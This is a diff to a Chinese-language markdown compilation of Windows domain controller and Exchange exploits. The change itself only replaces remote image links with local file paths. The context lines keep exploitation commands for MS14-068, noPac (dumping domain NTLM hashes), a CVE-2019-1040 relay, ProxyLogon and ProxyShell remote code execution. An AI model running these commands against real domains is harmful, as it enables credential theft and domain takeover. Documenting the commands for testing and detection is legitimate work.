@@ -68,7 +68,7 @@ Zerologon步骤可能更改DC机器密码导致域故障，未说明副作用/�
      本文对近几年出现的 Windows 域控相关漏洞及利用方法进行整理，方便检测存在的漏洞，目前来看主要集中在本地权限提升、打印机服务利用、exchange 等。     
 =========================================================================================
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KZZyChGsoAXo3BSEicb6QdBvrTib2dibL3V8We7eXeib3quoZZSPW9fzQ7A/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/9b40becd53bd90d78aaee7964570af9d654cf087fb2ac1a1308631df80d626b0.jpg)
 
 1.1Kerberos 校验和漏洞 MS14-068(CVE-2014-6324)
 =========================================
@@ -94,7 +94,7 @@ demo/hx S-1-5-21-3813283032-1038476579-1047458262-1110
 
 python ms14-068.py -u hx@demo.com -p pwd_of_hx -s S-1-5-21-3813283032-1038476579-1047458262-1110 -d DCwin03.demo.com
 
-![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7K6gTbFYgzkQ3ibtiavzicBCicQkMyCoUVJyu8gt0ia7cET3uCibvZKQaCtiaag/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/1c8d0f64979636a96d22870521df91750034407a9d633f49f12b7b5b89f6acdc.png)
 
 （4）获取管理员权限
 
@@ -234,9 +234,9 @@ python3 noPac.py -use-ldap main.test.com/testuser:p@55word -dc-ip 192.168.43.100
 
 python3 noPac.py -use-ldap main.test.com/testuser -hashes :52888cf384b8d2e56e0cc2bb6b906f99 -dc-ip 192.168.43.100 -dump -just-dc-ntlm
 
-![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KIznbPYlpaLILic1eDdOicra9rmib9ITHicBKOFw8P052xXtuCicvJmAeibOA/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/036de0b6f008d8558906b3bfaecdef5a8f78a9330d67251cddf096d040f8bfb1.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KIAKZgP5wu2Bo8m0vgKAibob8cLer7KmqaW56OY5Fzbg1OoU5BrMK5DQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/56066e8a5d0c5bc75d90ae7a07a5001161de88529df5157a07d618199610191e.png)
 
 参考文章：
 
@@ -259,7 +259,7 @@ https://github.com/Ridter/CVE-2019-1040
 
 python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip  python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KyJ4DNelHibiax5KMIJwkh7uYUw1ut0NotkwVOeAqAZnIpgTrCia3gZKUw/640?wx_fmt=jpeg)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/f0d4b322a4bb2c40f3d209fda24a2d2aeeded06ecfbbcd9cd89f8d0ae1405e2e.jpg)
 
 1.5Microsoft Exchange 任意用户伪造漏洞 CVE-2018-8581
 ============================================
@@ -352,7 +352,7 @@ https://github.com/hausec/ProxyLogon
 
 python proxylogon.py primary administrator@lab.local
 
-![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KehLcWozq1rIrOHxOyB70PRT1vFLaUWJnNZTVNA9oBNs1RZvhibMSe3g/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/a4f2238ccfb7c3c9e59f0c671ea1bf54410afee04aef0848cee3476b3be5ce79.png)
 
 1.9Microsoft Exchange 远程代码执行漏洞 CVE-2020-17144
 =============================================
@@ -395,7 +395,7 @@ https://github.com/dmaasland/proxyshell-poc
 
 python3.8 proxyshell_rce.py -u exchange.lab.local -e labadmin@lab.local
 
-![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KjbgANE5umACg99ozMDiar87QaHrDLKnKR7BRrAgvAoIn2HsKYxnC3XQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/407b11aa496ac17428bc415ab16b518a4db1db176811c46b9cacfe38fca0d20d.png)
 
 1.13Exchange ProxyToken 信息泄露漏洞 CVE-2021-33766
 =============================================
@@ -404,7 +404,7 @@ python3.8 proxyshell_rce.py -u exchange.lab.local -e labadmin@lab.local
 
 https://nvd.nist.gov/vuln/detail/CVE-2021-33766
 
-![](https://mmbiz.qpic.cn/mmbiz_png/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KjbgANE5umACg99ozMDiar87QaHrDLKnKR7BRrAgvAoIn2HsKYxnC3XQ/640?wx_fmt=png)
+![](../../Web%E5%AE%89%E5%85%A8/.resource/remote/407b11aa496ac17428bc415ab16b518a4db1db176811c46b9cacfe38fca0d20d.png)
 
 EXP/POC:
 
